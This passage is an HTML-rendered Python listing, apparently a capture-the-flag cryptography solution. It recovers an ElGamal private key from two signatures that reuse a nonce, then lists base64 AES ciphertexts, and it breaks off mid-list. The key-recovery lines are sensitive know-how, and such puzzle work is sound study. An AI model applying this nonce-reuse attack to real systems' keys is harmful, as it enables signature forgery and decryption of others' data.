string">'ESIGN'</code></div><div class="line number25 index24 alt2"><code class="python plain">m2</code><code class="python keyword">=</code><code class="python string">'in&nbsp;these&nbsp;Signatures,&nbsp;important&nbsp;things&nbsp;r&nbsp;different....but....they&nbsp;r&nbsp;one&nbsp;and&nbsp;the&nbsp;same.&nbsp;indeed.'</code></div><div class="line number26 index25 alt1"><code class="python plain">h1</code><code class="python keyword">=</code>&nbsp;<code class="python functions">int</code><code class="python plain">(SHA.new(m1).digest().encode(</code><code class="python string">'hex'</code><code class="python plain">),</code><code class="python value">16</code><code class="python plain">)</code></div><div class="line number27 index26 alt2"><code class="python plain">h2</code><code class="python keyword">=</code>&nbsp;<code class="python functions">int</code><code class="python plain">(SHA.new(m2).digest().encode(</code><code class="python string">'hex'</code><code class="python plain">),</code><code class="python value">16</code><code class="python plain">)</code></div><div class="line number28 index27 alt1"><code class="python plain">k&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">(h1</code><code class="python keyword">-</code><code class="python plain">h2)</code><code class="python keyword">*</code><code class="python plain">inverse((b_1&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">b_2),&nbsp;(p</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">))&nbsp;</code><code class="python keyword">%</code><code class="python plain">(p</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number29 index28 alt2"><code class="python comments">##secret&nbsp;key&nbsp;in&nbsp;elgamal</code></div><div class="line number30 index29 alt1"><code class="python plain">x&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">((h1&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">k</code><code class="python keyword">*</code><code class="python plain">b_1)</code><code class="python keyword">*</code><code class="python plain">inverse(a,&nbsp;(p</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">))</code><code class="python keyword">%</code><code class="python plain">(p</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">))</code><code class="python keyword">/</code><code class="python value">2</code><code class="python comments">##---------------&gt;or&nbsp;:&nbsp;&nbsp;x&nbsp;==((h1&nbsp;-&nbsp;k*b_1)*inverse(a,&nbsp;(p-1))%(p-1))&nbsp;+&nbsp;(p-1)&nbsp;&nbsp;&nbsp;</code></div><div class="line number31 index30 alt2"><code class="python functions">print</code>&nbsp;<code class="python string">'elgamal&nbsp;secrect&nbsp;key:&gt;&gt;'</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(x)</code></div><div class="line number32 index31 alt1"><code class="python plain">tmp</code><code class="python keyword">=</code><code class="python plain">''</code></div><div class="line number33 index32 alt2"><code class="python plain">aes_cipher</code><code class="python keyword">=</code><code class="python plain">[</code><code class="python string">'G71nGgtgTBqAlDY5ly5jr0HV36nGVkDB2QqYMlJ3/DzxE93u6MDbdGaXASH+cb4mTMLPcTbyjlZm\n0Y1AD3B6q9UloQssfIorvj6TjifQ89KaZSQf1YkRl1QzcL+DLzDhvMPBEwpwhZw6CAYVitfUHHRu\nefNhCHWFfyYYAaMbM8BFpB8ndYMsfgF6UmhJc+qfMnxF7GqYduQwqqtmOXWnde08NAbMJzvLvZdW\nYxCkRpXMAOEf80R9jkefmttTKZ2hVS23MFI7rM4/sWccpNCb2fhR0X3Mk5rpk5F9fAmmvICPkTi+\nsGYg/GLIIzxwcGTZuBUVo+GDzVfE/vYUMQbhs8rYrdIffdRxPuSYkJIYvL4egnpNI7uk24xKfEWy\nDo1Zf5A7bjMdJ8q572JGX2/bzXGFdZw+GXIVVuZmwN0seG3Q5tCI1iMHmPdmToEhK7tZpHw4wMii\njYq4lC518jXcfhmkG7OxGer0q4D6EcjYPr10/nGjPf9lp8ra6cAungruZWnDmjUbQcC8d2itrp6D\nqqAcKkNYda3OGs2LSWJwTcyz7mNhvn7vlAo9XOtI3dT6CLCqDRFc9r1cXFw7A6uFDth3Sl1Dc6az\nRwiE4U41LIPaMWO5AYhkmREXXL64LbWkOWnB0JDhohKAn/ZvXgd2g+hiaCkAHvwRWu3AvLNV5V2v\nzKaGF9prvinT2EYIyV66tdnCAs+2NaiZDj4E3L3FBRNxl+p23PwYMQ51x0hqKmIU2EEcDx/ZEKwn\n/F7jLoAFHk/1/aoR5a55fKo+jBm9CHjlhon4QQSkyheZzmpyHCNx/BTFID8VfqhlSRUHPVGI/Bui\nIZklL5q9ssWobYNcUoTEnglFCsbhu5PGp0VEVNyd2ypQocG5C/DTPSqP3bdmhNgFxUgW32RpRowx\nZItKRlrTZnPwFY9T7TXpCrMxydkWf/1nELWkAiqYGbIOCRRzua0DRfVNF1rLoJQF2V61lhcwkXub\nCBKCRsrwmaRUQVshECW1EC6pV0Tp8i5SQ8HhbL3DOae2rFTnmw/wnpTgU28dcb4eKEdAYHlZYPd5\nRJnl/jyjHwu1TaGLaY2X7ic08pEprRBz2+U7rDFdlMHAqRopbARzQu1Fb5oQMGy2qAP0QnAD9oOX\nmr6ICRri5FIa1bS3Bb6+qypCVwAc9Uq68oYvSegck6Tv+pvKxLNpx6XFMEzDU81KkQ9uOz1bGI/n\n5+uSrW8fJJAHd3RhYWPfVIfSWmwZ8rcCzhIZ3fZ3iXeEw22j86rhqe+1p/6Zjh8q\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'ED4pq53sQmybRul39olkA3SMqIPDiIxf8E0+rEdUAffzbLjBY2yAsuvd9g7/7YU4BzE4HX+AS3ay\nGgJFqXnYSbz7u3qw7MPdJjVsgyHE9aju2oHXIvXSAk5vqUwKRLT/MjtPsHi9b1D1lG3ua5Ip0hzm\nfGzaWKkJmfeMRItY4FemrdbKMHsxSHGduy9CGnUaDPFdFVqYjoxYCsGmPIXYvjs1Sr52XTyfmrK7\nsVZqRKD3eTwHPhkSFJpsJVZB0O6gi35aIFPzfABKtNEEKeMtI8ZxfYYWGt05C42oT9bBBqyIGdTG\nWBw0aCysHBHhAEN6Mh1c+iJSryCDkQSCgawCV55AktYt/P1+gx57LmijFJp8cvy0AUtycV5r45N8\nqPAoDNAPZsM6qdviX3VLXnOU7PIca+jwQ8Dusgxaw+A6L4eHWupFj2Kpnk4zfOfgHbrMZhgPHo4D\n+s69IHfX8po5GDUVo0u9GdQj8WShqAPdGtOaou8jYcnpNXpY+RPHb3NqZfgsujR39Vuue4XYmHeo\nyUv5YWER4YbSDqAbmDE4LF3gO6ZkoYMbpFyHNiHW5Q6Iimfv27bdUM/Y7Y34Vv4EgceJmdbGUvpG\nBmuscFb+6XBo4vizvyIniT/DNUKLDYIT3vWvSY9g6ez3mZLP4V+liH0E1NbVFhBeGO7DtkyCx8DV\nln8JviO23/U3sUBYImM0Bw1TCkzRTsc+/ITjO/2dBEE49WTLuEGCG+JIN5S88GQ1xTMAfLnjyujx\nwIBCl5sI4cOLw4Bj+zJ5hMWaQxxZm9UZVlkRAelR7Ahbp5+SuynXaU7sBKNk0Q/z9ZXyY5GbN6ud\nzgd221tT2bunkKbw3F9wMONsm/TDPC9DpuTkLW4qbCD4g4OXKO2tdTKWBrIPeEV9s93BNrXs8LqH\ntwfEGbl5c8p7IHLel6vLUKq/wndH0CxcKZZkd2x/K2G+uff4V2EYMWn3TZdZWWUKcYaGSvJ6SqZS\nK34pLO0jCR3WlM9ObsZCvMqixF/PTMWA4LK/x/AJf7Xc6IOVv3IKgN9UTcxGhNVUQZSEdbxh0ZNA\nLNa51++PQrt9Powr5ZetaIdT4zBADAwcEULYbKA2ma0H53fTPxRTy3SzemIEdvk4fwW9N72N9JHN\n29QKr1WYwOj2s2TQD7oNFIwl4pxAt1T50BP92JZcpmImIy6vfCtgpA3mlLrtmiVpfDPyZcNRiWJS\n4+vGNrt9ihXAjIPEC1ZtqNLuH0uRl3Zm3+zZrchw6C72wS2/R5PgyrQlKcuJRWdwVIWefBYRxIut\npI9sFEJ/YGQDGDbADMzzgx0DUgDsb9DwjonnWPlS0iamPNRVLwNAZ/GZ41PdWfpXSXY4Stl/VURr\nlC9G+17/9FA3JjR+brge4Tv6bGMJieD3K+wsSM7ZWjjcN0e01I0CqrMGk81/onoW/ZYr/8lGUHem\n57mQ/tIsRvxBa4+APcdHQEy0vLowdkN2ZKCxnC0+lw0v7quKI9l8N1lVacUI6HBp9LpKsEY=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'lZ47Cr0QmoBxPm4KyDgrOLuXNgK3TFGrcrlx/kNb5IP80lQib5TJOv++5zPsYpioT78jabZNhtYC\nWA0p851yHNQso+p2KTvy8RPbhqPkgVNPIuqYV+kX0yAypKHeaX2cdfci6wSLNbkq4t1eVnyHq1bf\njxLcKfG7WpKNUEnc7O22gMIZY9dR9Ctg6o0gSaHr\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'sei1bcxEOGSD6sfFXg1HLTIOiUD0IBcnsz+MYoNiQZ31trOWtx61usgc1CcExQv6aublc+xposjs\n1W4wZRJYQ0JNPeEMPJfEW5ISAGqW39fbu3QRWi0OCPKYYQEEG9DsTJU4IoFqN3rwhuAF7CCKPIuv\nfEXi/5pUyrJcmLckD4rIUBfDacgeLfMJzXDQn5h0Oe9C/lf6EMQj9nDthjzXKLNamsE9wxS1YXqJ\nk5RpHHmLH1ZfRzfgN8tGyEbcLHjgOv4DIXVLXHHQEfFMAf/IEffm3adPyXoal0EubvYdES9JHSB/\n0nh6sWt1jDXFNfY6wI7fD+MBhLqcaM66c/E+8Jyn0p160bl7xxwJRxf5QFocMJW6q7HDKQS1foSa\nFM7dxHaVeopFX0Mf2p0bxEUWM0BLI5aKWMgojt5nBWWj3ke3HhTjZE0R+1FmWeQ0z3fnVkWt/qrb\nP8mQFNHenhF9Liu31kNET8a36Rp7dl/Ub1JTYFvmraVmlWUr94p+/aR5kQm+DjoYbZm6mXHQaeom\ni28wwClcooOTY4sV42/d4iYYgLi41qbha3uUi01hw3FLOUiM52uQUchgbtllda1dT8Hu6j6+xB9F\n8DfHp902uR9jt3CifRBmdT9WzD77nYNDuot8iUtok8kB+b2l9QllHDpG2oJ5DADn/0tOurE7Ztrf\ny/0C2mCqT/J6k+rdni/Rmx5PpD3DCSQ5k3ebForUMEyAIZqM1vaSk+Inj5tfP2j/iFq5aOmkXgre\nX+4Cubmopk0PHc2b+0w74dPGFw9pIdJoI6ovjBiULusgsXEXql64MHI/tGZ3YuXD6qgJTplOW51A\nhN4EaYhzmboPhZe5i2aYR02houlwEQxMtLRNGDgG58ndlnNYnrxRiUm5E8JVj3aSPqpJ4s+SimWY\nocJSEj1uEtsCvrnCXYUHweibZ2jlhqUTzhG9V+8hVxgBFJGS46XBZ6dBaWsdJkS7OWdGNCOJsSGT\nV1xEZSLIwJQlLz06qWUnqz51eaVUKjYSfey1XR5J1f3gYNNiX3umKQ0G+GCU2tvrJziX2EO0LKJ9\nLPqyhlR0jrE0XgjGKZUZGLcbAdYbvZAIMGhGh2EyUPJUe68vMB8mCUzukI5iAMAUtSKMpoTdPYBH\nBvv7XVRFvFJy6n3oYjLwglaAgnde0LPnUqelmw76d3iuSIz7H3BhxUZmtarTRh/KXC5Ye/bgpqo7\nh6ZlEEps3iQSiXdfSSPERwy5V2ovM96NHsqJo+nUCK/CkvQxsLF8TlaO2mIc/lq9MKa0eNIGScMp\n6yg2LArh6rG5qIdBvj0wr+Yw0q81vicFUKw5r43NxxCtP5YRAyuNteviJEYZchb12K2LQbA63V1d\nXai75RG29+DzdXl+jLzZl8el+iWzMFBe+nkZGQc2HQlNERubmM4nvu3r/L8t+9PhnY5wPbTGKCom\n30ef1oQF+fTyWcRHSrtQRAbF/4hcqWt63mHajVjpz4nbfsLu68eFILUH6C7852vlGAilWN4=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'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\nCoMBVWdOfxPXhsInNAm5h3G7XqM=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'ph8RjRg+OQcHinhv2aVqb6eRuwK06y1jy1SeVnMFCVcyhuhC+Q1atNTe6GmMR415ZLXBOusFUaQR\nKgWB/5QQ8jG1yccPqHJ1VA+xkjtyt92tc9TJL6iN74pNTECd8yQ4r4CuKkG7t4qbT7HByD5mxVPn\nw3uxiOes4pjGUgF8Y3BKwubiDuhOahYSK1lYdlvsTBbnVKjzUBX4OySXNg4Tg/gdFVWvxbYPE0Oz\ntbKD+THwgfEUmpF8V3VY8ogAi4e+tWrru3BYdEtj9QBmmRAqaAPs9IvXUiER/CEgxtaj9W3cAO04\naa6DCkCA0ZXqsJQB1ZHpHAIb+wMXWODJzYSoHOB81HfmTVzkIxd71e891iACnSo/f8r0YOdDN8JR\n9r728+CMKlAXOdhKcnmS9nPPCZw87UROGVK4hNuNpggJ0tdHkgOcLAJqK1cMxbBHXPiyZF675EL+\nprgn6pQWhVS2ckLLroG4RrIoKs4E0oO7ibPtbFZmbsz1mE5h3D5Efo82Ry5Jd1e246tBKHrqIUL2\nw9TwGMHZhTVND/bY0ONsAIASZMiJwOQPl7ejsu544QwL7estgePpGGITbuPZvt+2vbmIcbz3GG/W\n5qmHYK4EcpfHJcRxwkeu2wlH3IjxaSJj+aeYM0u9Ne0JaaIhzFquTFp0CaEYCUB2nBv9IodKvlUr\nNTKTu5/TlTQxa3cdVzKr1wnAjzpQ5gGq/47jjZN6E63aemJpJFrvGTpkiaCNUIMgSV5GqvCETROy\nXWKun5G2fZFS4nYnph4NUHLMNMpf4wRgd6V15G0dy6c8ngPqu/oWW/heynguUnN0pC9UIIVNo5RX\nuiyejhEab3LtnVglF0Hyj5d2xrcJJY9GvykN5H1Qq5ekvtYyf1ABFh9lw9PbkIK21ExOvIQqSSKf\nr58Oe4LwO819zmWq1EJZaIjIVUAwOGdOgjjVthBLDQ5nLkfC8LsCaYVDFY2VpbIAPFEB+LGOSRPg\nhtcYZqc3m0lJ6wo=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'GRjhnUU1+q08d6/e0aU5AwQIBcFMLyGyIL39Gt92MbgQyNbcYOJMAPQ3RJp6LGKeE9HKUpOLsSlr\nh06NAL350RzJLhJwcaKDq1cEkN65acy0nwabltQp/U9RUNkY/djQEYpEYWFgMet1j8gdre7RMc4Q\nC/08MmLcRwHSwmr5OnJKc3KbFUksGV15ERlNDTG3INTjE2w1ZepBA3G4BNz5AMa0/yLOTZvcZH0z\nXfsCmM32kfH11w3MowrPcRdZkpdbsKZVpmKWO1bntg/pozGxJlbYXK6t4gJhWzZM29xiBxpVCUMT\nBd4MpTRLKitvL6AMN6EJLMRfBZn5idu/zCEwv/VeX+3Ibq/SAFzaaDohUd8Z6t4w+mX6QLOPoiDL\niVgITCPkDQvkSZYXQlZaSW/LqGP0pJN9YIReezG8mFyo9YyNjr+Zkxp7RkDeXq7FVaH+L2nhqpSP\niIl1tCR6yOuLomI0xnK2seLYRekEYYJY0E9+Ym+2HsnTBQSVGedc3P1u70UsBlQXj1/2JKBduUDf\nlOERaW4f+qnDEZliSL91Jeo=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'tMCKL7CRa4PLKzTvutetJMS33XWPc6fv7SzppWMMkyahAAh9R9lTvZcZ3QjZ5Vlfjg6Gp78Cfxq0\nJo99faQS4XzCVMmOuYRFVQBFgSMGydoC8VX7KiBf0hqxNpXQloVW+JeUHBye+BAr6UhkVfvjunrI\nFVEGD8VkuaJ4CBLxDWJiQSXFTTo9U5+W+1Pfi7qIdwbvSmZPT4LR+jOFwMHyAmWS8R97qP9zsRQu\n7EmlTWZ769S3XvA/S5j/wMFd7shXvwnYG8gH0Yt2/xWcBFAQhJxilAg4HyEv52i49JJH5JPI61Ad\nf9cWLzTgkwU6tTONxmzU8RYYas7BDfyzJ0Q9/bNAqdGi2UWLCrZMpsdEIt+TQhEH1LTsZ6gAqgnU\nzfXYkvOw3znsgdgFev+322HKl8neu/wad6WqsT6BkCPuRIKKMPZd6V0v5S61PSa+741hsGk76mhv\nuaHYwXJy1IOnT5GsI9DSx4X7fUjhbxx/EmMRWkZQB8qfrnKXwBam5lnH0EYAhpcCvwaQ1946NoNL\n1t9rY9WN8XewRPYp/gAeIFTLOxsB5h2sQkkGbPDHkCR/gYdFZz5G7WbVAyzCSUYDextgsyHZ2w0B\n85w6tBw7CzX0q5BXfF2io4UDEYLY987tJcuo5IASzTY1YgXojTcKoWjX2r2WCii5rXuBC+4bWSpC\nh738VSSeH66sKX9tzARnGO3VpdLWfh3R3+Wdb37OqjEZWN65cUbpPU4EklXlDvSS+cERvmyHkaal\nMBZky1bwoz/XPwGKb/7H3DktFXi7R6hdRXF5Jj77zKsfkkmmvau5N54+Y8UkqglcA1kKeujS9VWF\n0BxUCLpMoCpcLLEP5KgoR0PBd/nwOIRXgSvz5PDgVK/+jIzLhq9HPPjvQsRLxtujn0RB3IZ9MDkH\nNeGi+WFu2dD017Et6zp2rJR058Xf8cDU4mmN6vkIdVwau0ZllVjp1kBN4OWRs09nW4qDB7Z++i/K\ngWJXYtjrgvR0hpFrcNs9/C6JmPcg3LJ6ZTmrO6UeGPh9R/mDc6PelboT886c3iui3l2rVLlLexHU\nlqFTEm7HMWiZaIEU6wBC9yjpJ5ASDQBNcJAiTIpI2v6d6DGTQq47t+ikzme6qO3t4cIvn2+/RJbP\norfPBfM5BhRbs/B+LINM/r2PiQ7Jg59mk/WNviG0Jnl0qrfwWt/hJHc=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'KcSwxmbCC3rm1+7D/Le05Z0saLF9FP4CPP/J0mCMLyi3WRGmn0xubf1fgzuw2qPQzzEXJUyTZpCc\ndPs9CzSYcEnZvHxYWKLbz4cNzeZD0obtJ2YUaNzYvhBQfht2yQ6t2X4y2afaJCT3NUE5ILPqXCjH\neM5fZwAFJOZS3k1HjS5H66q7lJJtowcLPrNfFvoXr+rBUuok3kTf0+Lx1CwyJnxu4joK2StBnWY7\nrnpQNaURaiB95rViEzo9R47AZIPN/UzXikDhWVyedoSBQ4vwxROfjZwXcnoh0tV6ArgSMUOGyBxF\nuRBeN3jyj7L4cezTeGOviETr3JFehKpk3Rw49foHGWcxOQUVk8BngI4rsi8IOZlDqByzXPZhRfAx\nul74zelOopzR6r5qL+Xb5dgSMiwD9Od1WoOIXNZK4Ws0zKlacI0BLN1VL/Kqu8FeVV/nrLY7cSSg\n0zt8uR2bp5n+cstJDYBD3L3q4zOILr5hToit1MHCftSy/nt5HP0BrYcoAycYE7FAHyVOA+Daq9/N\nWrL8vJ0/NtUZsuooS9Umh25Z43EyKWJJaaCKlKKXLnJJdH0dnvhsrnGp2cIM0Tw32I4luPdXnT2/\nr5iRxmZNb3yrFyy2Df6xuf+F9QBRpBwA6LrUf9IqaicY1i8URs9GBlm9ELOx3q6pWnaAM2YrNDMH\nAj3zyNq6eRix2NpxZe9400Bd4fpKsJEo4h51EteeyIg8FoVwRy3x9SCJb1Gs1GWTRZb0b4+sWABu\nAy36i+rjkTe/P4GOR3aSyItGRCE4zqaQhFEo4il1LzwQ3VPH+V1s+o9QVdoQEOTCvlZeOnycgUEX\ntwq1u6Q6iVrjcjffVaz0c/i0+0PRIRfKugAjiEd/CopsPPItOMaHtS/A0CrqP0o4oim35YUdVVrG\nyUSwlof2iK9QReUhaN03+qgQgxmzyqcm4wXz0O1YZg8/swA7ltfj5nvQC7fcIIOHuAPS34BgJ1ff\nMNkPLXbITHALf1CIqQf0xBNEm7jlOvcYDWzD\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'DUEHkcLhWgLOaRmLyZ/ir1ZRJ5J/PI8ekzWJpam0Rk1mZ0t7YD7y7gASHLEuspzrWfZQLeIlAX/W\nQVVdDKwsCF3pfFn3z4hBxP2IfFAbuvdNETEjhIKtHFE/czUpFH6OvHlWkuHI9mq6Kf5X4LCTQwqW\nAvlIgz7valMYudCTiUUt3aiYYlJFO6uCg03GjnKehK5/cPA2QACI24GAo2uPVII0SnygAehNw/AG\n9ZBCE3r9ZF/qP7RAdfQPZw+wUFiFwAAMQNU87ykTFn0v2Xbfj0Rp313+6yubjNkMAmB6SzkbInUM\nb/DoCHYZwHfFn4WbNycN4IJI/d2OIOVwlUyZU5tlgMxQQKK/IHS3AKTfuIWAXoal8oWG61mqzpaU\nZ2ZctqfFfaA/0eoq1SQYnnD9TCfIsWiZoOsvVBeb674YrY6epGRCbOuWPGnyFK0EPCk6ZZZ4GZH2\nse5Pvyr6vbn3qFtop7jCehSobYLS9i2IHuM5TGPJYkpIehuXbPM8IZ8+rMc7j1Ypt9Gapj6wqUN0\nLXCZgpoBRo89GXNRHrHpdLcyk8IF/q8L8/ucze/QZMKvM1UPOf2U9jqNFipf9RCFyQ3CxEfII488\n/q6EHN6rapczWQl8alQrmY8P5oSiJic6KlD18cDS9NIPdGajxg+rr9H7sQlZBVD5ILaAb7Okwnsp\nL64YlIAvEyO+sknsW4BLHD3wH0HgmoGmQoYSfz94wA==\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'lxmbvU5gPSomqdQ2ADwPl42v5gY0pmcNYNbnTf4jnvbIf4aPYBm84hI4T40kKJ1JmapldCP/Xdtg\nRXi75G8mdhBKq42sy+f71T7sAI7yIIwbY7HOly98E5OgkYlMl4uhsXXMgFTCZY9sfFxesNlBNP9N\nYjy7L2qh+vzx41WF8vMBJm0Q+IlTJ3WqOCnt2y3kBPjpfv2kY2DMuq7SS2l/hMA44GcsM+aRo9PX\n/pdn+OcBnOhz7Q1eZ8g2YnJff3oM4a9Ch5zuIbWvR/ku4eGCAXBnoJZuAUJ4to8hIda+CD4ZniQY\n0IxJty1ml+fB9j1jrzmiCTlET9145dgV1xKjkqQplHpgOnELda3H93giULgwMR33TfRu9VICJlqD\nhwTIGEGOwSI8x6zoJl29zEOrqUqdxuvRUHc/lrmBPYjDnoWeVVN00Tv+VhL7oac62WBLCtybNQKz\nSPcQufg355gWAxyYjFvi9q96jlVTm9G+7Sbt/K7iNqhqEObW2ftgkR60W2FmJ85W0Ea+4CDuG9hJ\noRrpCJ4f/pGEJf9zBZjuPZ1rtQA6HLZg55Ngo0xSfE3+qZF+4PW97Oq8vohgu8m150QUoAXzC9ET\nzT/YjuRP3LEEVkiw/+f7DQBPr99atB0kp1ZvDPN4jv1z+mSgqo1PTjqvXYGy3d5SiFE3r3bI11Qk\n4GMLV3fEhwY8r07mor95Ib91UESke+PfAkF8njB5vUoI+1E1gw9x84Lm8T2NInYYhsYtnPnc21Jy\nYrchJJddZ8o/kYMD2Yk401mRu/4I99nJb+CCcLQJRYjqca1B3Fts2Kc4yAFCWsCEyNBglWv0EnHT\nATFRHy97y0JS0YRFsolksigZKkZMTHylxe+Lz/WRjhgLhrMZS2Px0uFzJfr3L23iJ7VJ8uxpPlAD\nBAkOkLOsNfHmtjZM2TVX9gjH1SwFH+5+oAy4TnkjtrvSeqIBcloXJCcwr/PoxPbjPLlZCbCd4Uaw\nzeRjP2cCeJ3sKd3pYFlnruDYNophDRpQKu5W2MyD1P23DfemtrGn4V1j/uSIfZjmaRI0HKIomcs0\n6BcYZBM7FrnVsHBT8kiCHEmhr3kzJ9MwXgRdzX/dKgIUyPRlmOVX0RuGg+RBHMIg8RcgamtPtnz8\n8G5GyeCe+E0U\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'vJ9r9C4RduBDWIJPJkEQn/+DJd7fsmyKPdNG1ky2+w8ukb3b7hINOOFTR8G8dyCOqD/39hOh9t8l\nXc2St+PEeCNLrq7+PLbYbIuDPoTHv9EaOouiZqugj2esWkLDQrnDcXtNqtlS+5Fuez8YdWaTwbmk\nHSJKh2fIED/m3Zb06KnQGUQqzhTbcLMvtjGOh+L2mBaNqbyxYMizDx+Gf7s+uj2SKDMd+qdzGd+n\nSCHg0mVfP0l7bYwDEeZjpwoCK0RkxahNAvQkrplrcafdgePvoO7hBrwXZXU8etsEb0NdvBTQWI+R\n2DbJcr3zAwWFkG3GrTl2TPvaw/vLAyFM6PFyh9VzdztYVi4aF0ZS49q3riFngIqhW1RkVeUy/i3/\nToLehtzpZwedHkcpL53hSHAE/ZzeqRI4fVvV4ZSGbAzuipa8fFhnbV9c+Jlm0p6fHY9nR+aUVQx6\ntQ+z8EsP3Jazbko2NMLVqAVQr6Jht/a2vW+xKyTD0B1CGXqOTu1qdaTJj0+5TYn7BljWSnhUWzTd\nru4OnCuNttYVVn9H201TsltTry2uZzDdBbTchaZkSoPU0UFNQvnIoG3VLFD8mQYMxqHv0UXxQE/f\nmnkUCjtI3S9YoOKYVWjOXklDjJKX349E8gONr0v9shF6Y6xgJiavOe81Qjn/2tZzKgy6b55084n4\nlcX22uifOjWwGQTLXYwNnZYUkyt9+mvzphLmfCr20g/bksNxxVGRiJ7BEAZUbQ0gUkEcMMcCbF6K\nkYCvqqJxsuYyR211YK5BburdM8ixTrtnbOSgAO1tSv2IysU5PgIoRA3sXfku5hVdihWh70Ppdq1o\nTPsPgE1/zEHJjEseIiKezsqHCDqvyzMsyhjqrmYuBFQ5H7dmLl1NSigy76sEMP21z7i6Nx+iwOen\nJDasRZbKRZyE0jZE2qKTnnTmq9rpXx4dEKg1gV0JYv9f0ARaOjJhHINXIaM/ruz7ujKHeTjCptEW\nU6oy7dSQKu3hkLmvoxAY/m5uyMwP42j5a7JRuPmKjzVpoqQX6JUwBfjxX9+kCAaUZv+hmqcQJ7nU\nRyPihABajrffN4ccpgKOGWHG2mmH+DRnQis5H3vByLu7dEk9oXgop9zmz1Cz2kEYNTgZLTht6lGa\n1Jk6j9nbYKP4ca2tU23d7l1llGU3XddQQw==\n'</code><code class="python plain">,&nbsp;</code><code class="python 